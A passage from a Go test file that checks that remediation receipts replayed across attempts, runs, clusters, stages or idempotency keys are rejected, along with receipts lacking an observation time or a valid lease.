			[]RemediationTarget{"stream-1"}, "worker-1", interval.created, interval.expires); err == nil {
			t.Fatalf("lease interval %v..%v must be refused", interval.created, interval.expires)
		}
	}
}

// TestRemediationReceiptReplayAcrossAttemptsAndRuns covers replay in every
// direction a receipt could be redirected: another attempt of the same run,
// another run, another cluster, and another stage. Each one is a receipt
// claiming authority the attempt it names never held.
func TestRemediationReceiptReplayAcrossAttemptsAndRuns(t *testing.T) {
	now := remediationInstant()
	receipt, attempt := remediationSecurityReceipt(t)
	cases := map[string]func(RemediationReceipt) RemediationReceipt{
		"another attempt of the same run": func(r RemediationReceipt) RemediationReceipt { r.AttemptID = "attempt-2"; return r },
		"another run entirely":            func(r RemediationReceipt) RemediationReceipt { r.RunID = "run-2"; return r },
		"another cluster":                 func(r RemediationReceipt) RemediationReceipt { r.ClusterID = "cluster-2"; return r },
		"another stage":                   func(r RemediationReceipt) RemediationReceipt { r.Stage = RemediationStageRollback; return r },
		"an idempotency key from elsewhere": func(r RemediationReceipt) RemediationReceipt {
			r.IdempotencyKey = RemediationIdempotencyKey(RemediationIdempotencyInput{
				RunID: "run-2", ClusterID: "cluster-1", Stage: RemediationStageCanary, AttemptNumber: 1,
			})
			return r
		},
	}
	for name, mutate := range cases {
		t.Run(name, func(t *testing.T) {
			// The digest is recomputed so the receipt is internally consistent:
			// the refusal must come from its relation to the attempt, not from a
			// checksum an attacker who rewrote the row would simply have fixed.
			replayed := mutate(receipt)
			replayed.Digest = replayed.ComputeDigest()
			err := replayed.ValidateFor(attempt, "worker-1", now)
			var rejection RemediationReceiptRejection
			if !errors.As(err, &rejection) {
				t.Fatalf("err = %v, want a receipt rejection", err)
			}
			if rejection.Code != ReceiptReplay {
				t.Fatalf("code = %s, want %s", rejection.Code, ReceiptReplay)
			}
		})
	}
	// A receipt with no observation instant is refused even when everything else
	// about it lines up.
	unobserved := receipt
	unobserved.ObservedAt = time.Time{}
	unobserved.Digest = unobserved.ComputeDigest()
	if err := unobserved.ValidateFor(attempt, "worker-1", now); err == nil {
		t.Fatal("a receipt without an observation instant must be refused")
	}
	// The lease is checked after the identity relation, so a lease lost by an
	// otherwise valid receipt is reported as a lost lease rather than a replay:
	// the two demand different operator responses.
	err := receipt.ValidateFor(attempt, "worker-2", now)
	var rejection RemediationReceiptRejection
	if !errors.As(err, &rejection) || rejection.Code != ReceiptLeaseLost {
		t.Fatalf("err = %v, want LEASE_LOST", err)
	}
}
